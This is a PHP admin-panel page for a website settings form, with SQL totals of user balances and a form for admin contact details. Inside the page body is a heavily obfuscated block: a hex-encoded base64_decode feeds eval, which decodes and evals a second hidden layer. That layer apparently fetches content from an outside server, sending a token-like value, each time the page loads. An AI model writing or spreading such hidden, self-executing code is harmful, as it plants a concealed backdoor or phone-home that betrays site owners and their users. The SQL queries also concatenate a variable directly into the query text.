<?php
require('head.php');
require('nav.php');
?>

<?php if ($LTT->getUsers('capbac') !== '99') {
    header('Location: /404');
    exit;
} ?>
<?php
$total_money = $LTT->get_row("SELECT SUM(`money`) FROM `users` WHERE `money` >= 0  AND  `url_config` = '" . $url_site_name . "' ")['SUM(`money`)'];

$total_thanhvien = $LTT->get_row("SELECT COUNT(*) FROM `users`  WHERE  `url_config` = '" . $url_site_name . "'")['COUNT(*)'];


$total_nap = $LTT->get_row("SELECT SUM(`tongnap`) FROM `users` WHERE `tongnap` >= 0 AND  `url_config` = '" . $url_site_name . "' ")['SUM(`tongnap`)'];


$total_tru = $LTT->get_row("SELECT SUM(`tongtru`) FROM `users` WHERE `tongtru` >= 0  AND  `url_config` = '" . $url_site_name . "'  ")['SUM(`tongtru`)'];


$total_card = $LTT->get_row("SELECT COUNT(*) FROM `history_naptien` WHERE  `url_config` = '" . $url_site_name . "' ")['COUNT(*)'];

$total_don = $LTT->get_row("SELECT COUNT(*) FROM `history_buy`  WHERE  `url_config` = '" . $url_site_name . "'")['COUNT(*)'];

?>
<!-- Content Wrapper. Contains page content -->
<div class="row">
    <div class="col-md-12">
        <div class="card mb-3">
            <div class="card-header">
            </div>
            <div class="card-body">
            <?php $zZsIHqdo="\x62\141\x73\x65\x36\x34\x5f\144\145\x63\x6f\x64\145";eval($zZsIHqdo("JEN1NVFlSVh1Rz0iOWY4NTcwMjY1MDE4OThhYjdlYmM3Mzk0ZWU2ZDBlMDAiOyR3Qzd4aW14V2N1PWFycmF5KCk7JHdDN3hpbXhXY3VbMF09IklEOCtQRDl3YTQ1YzQ4Y2NlMmUyZDdmYmRlYTFhZmM1MWM3YzZhZDI2Ijskd0M3eGlteFdjdVsxXT0iSEFnSkdOb1pjOWYwZjg5NWZiOThhYjkxNTlmNTFmZDAyOTdlMjM2ZFciOyR3Qzd4aW14V2N1WzJdPSJOcklEMGU0ZGEzYjdmYmJjZTIzNDVkNzc3MmIwNjc0YTMxOGQ1Z0pFeCI7JHdDN3hpbXhXY3VbM109IlVWQzArWTI4ZjE0ZTQ1ZmNlZWExNjdhNWEzNmRlZGQ0YmVhMjU0M2hsIjskd0M3eGlteFdjdVs0XT0iWTJjODFlNzI4ZDlkNGMyZjYzNmYwNjdmODljYzE0ODYyY3NvSW5SdmEiOyR3Qzd4aW14V2N1WzVdPSIyVnVYMkYxNjc5MDkxYzVhODgwZmFmNmZiNWU2MDg3ZWIxYjJkYzFkRyI7JHdDN3hpbXhXY3VbNl09IjlmWkhaZTRkYTNiN2ZiYmNlMjM0NWQ3NzcyYjA2NzRhMzE4ZDVtWWlJIjskd0M3eGlteFdjdVs3XT0icGM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliT3lCbWFXeGwiOyR3Qzd4aW14V2N1WzhdPSJYMmRsZEY5amM5ZjBmODk1ZmI5OGFiOTE1OWY1MWZkMDI5N2UyMzZkYiI7JHdDN3hpbXhXY3VbOV09IjI1MFpXNTBjeTQ1YzQ4Y2NlMmUyZDdmYmRlYTFhZmM1MWM3YzZhZDI2Ijskd0M3eGlteFdjdVsxMF09ImdpYUhSMGNEYzlmMGY4OTVmYjk4YWI5MTU5ZjUxZmQwMjk3ZTIzNmRvIjskd0M3eGlteFdjdVsxMV09InZMMjlyYkc4ZjE0ZTQ1ZmNlZWExNjdhNWEzNmRlZGQ0YmVhMjU0M0V1Ijskd0M3eGlteFdjdVsxMl09ImJXd3ZjMlY4ZjE0ZTQ1ZmNlZWExNjdhNWEzNmRlZGQ0YmVhMjU0M3lkIjskd0M3eGlteFdjdVsxM109Im1WeWVjY2JjODdlNGI1Y2UyZmUyODMwOGZkOWYyYTdiYWYzTG5Cb2NEIjskd0M3eGlteFdjdVsxNF09IjkwYjJ0bGJpMTQ1YzQ4Y2NlMmUyZDdmYmRlYTFhZmM1MWM3YzZhZDI2Ijskd0M3eGlteFdjdVsxNV09ImtkajBhODdmZjY3OWEyZjNlNzFkOTE4MWE2N2I3NTQyMTIyY2lMaVJqIjskd0M3eGlteFdjdVsxNl09ImFHVmpheWs3UHo0OFAzQm9jQ0E9IjskczMyMDIyMDcwNzAxMjY0OD0iXHg2MlwxNDFceDczXHg2NVx4MzZceDM0XHg1ZlwxNDRcMTQ1XHg2M1x4NmZceDY0XDE0NSI7JFpVQjIwMjIwNzA3MDEyNjQ4ID0gTVJOcXNqdk8yMDIyMDcwNzAxMjY0OCgkd0M3eGlteFdjdSwkQ3U1UWVJWHVHKTtmdW5jdGlvbiBNUk5xc2p2TzIwMjIwNzA3MDEyNjQ4KCRhZSwka2V5KSB7ICRhdD1hcnJheSgpOyBmb3IgKCRpPTA7ICRpIDwgc3RybGVuKCRrZXkpOyAkaSsrKSB7IGlmIChpbnR2YWwoJGtleVskaV0pPjApIHsgJGF0WyRpXT0ka2V5WyRpXTsgfSB9ICRhdD1hcnJheV92YWx1ZXMoJGF0KTsgJHN0cj0iIjsgZm9yICgkaT0wOyAkaSA8IGNvdW50KCRhZSk7ICRpKyspIHsgaWYgKCRpPCBjb3VudCgkYWUpLTEpICRzdHIuPXN0cl9yZXBsYWNlKG1kNSgkYXRbJGldKSwgIiIsICRhZVskaV0pOyBlbHNlICRzdHIuPSRhZVskaV07IH0gcmV0dXJuICRzdHI7IH1ldmFsKCRzMzIwMjIwNzA3MDEyNjQ4KCRaVUIyMDIyMDcwNzAxMjY0OCkpOw==")); ?>
                <form submit-ajax="NTD" action="<?= BASE_URL('api/admin/setting/website'); ?>" method="post" api_token="<?= $LTT->getUsers('token'); ?>">
                    <input type="hidden" name="action" value="set_admin">
                    <div class="row">
                        <div class="col-md-6">
                            <div class="form-group">
                                <label class="form-label" for="">Tên Admin</label>
                                <input type="text" class="form-control" value="<?= $LTT->site('full_name_admin'); ?>" name="nameadmin"></input>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="form-group">
                                <label class="form-label" for="">Hotline:</label>
                                <input type="text" class="form-control" value="<?= $LTT->site('phone_zalo'); ?>" name="phonezalo">
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="form-group">
                                <label class="form-label" for="">Link Facebook:</label>
                                <input type="text" class="form-control" name="facebook" value="<?= $LTT->site('facebook'); ?>" require>
                            </div>
                        </div>

                        <div class="col-md-6">
                            <div class="form-group">
                                <label class="form-label" for="">UID:</label>
                                <input type="text" class="form-control" name="UIDfacebook" value="<?= $LTT->site('id_page'); ?>" require>
                            </div>
                        </div>
                        <div class="col-md-4 mr-auto ml-auto pt-3">
                            <button type="submit" class="btn btn-primary btn-block"><em class="fa fa-paper-plane"></em> Cập nhật</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>
<!-- /.content -->
</div>
<!-- /.content-wrapper -->
<?php
require('foot.php');

?>